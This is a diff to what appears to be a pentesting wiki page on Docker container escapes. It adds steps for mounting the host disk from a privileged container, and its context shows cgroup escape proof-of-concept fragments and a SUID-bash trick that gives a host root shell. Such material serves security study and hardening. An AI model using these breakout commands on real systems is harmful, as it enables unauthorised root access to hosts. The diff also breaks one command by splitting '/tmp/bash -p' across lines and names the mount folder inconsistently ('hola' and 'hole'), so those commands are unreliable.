@@ -40,7 +40,26 @@ In the following page you can **learn more about linux capabilities** and how to
 
 ## `--privileged` flag
 
+The --privileged flag allows the container to have access to the host devices. 
+
+### I own Root 
+
+Well configured docker containers won't allow command like **fdisk -l**. However on missconfigured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.
+
+![](https://bestestredteam.com/content/images/2019/08/image-16.png)
+
+So to take over the host machine, it is trivial:
+
+```sh
+mkdir -p /mnt/hola
+mount /dev/sda1 /mnt/hola
+```
+ 
+ And voilà ! You can now acces the filesystem of the host because it is mounted in the /mnt/hole folder.
+
+
 {% code title="Initial PoC" %}
+
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -56,7 +75,9 @@ sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
 {% endcode %}
 
+
 {% code title="Second PoC" %}
+
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -399,7 +420,8 @@ host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
-host> /tmp/bash -p #This will give you a shell as root
+host> /tmp/bash
+ -p #This will give you a shell as root
 ```
 
 {% hint style="info" %}
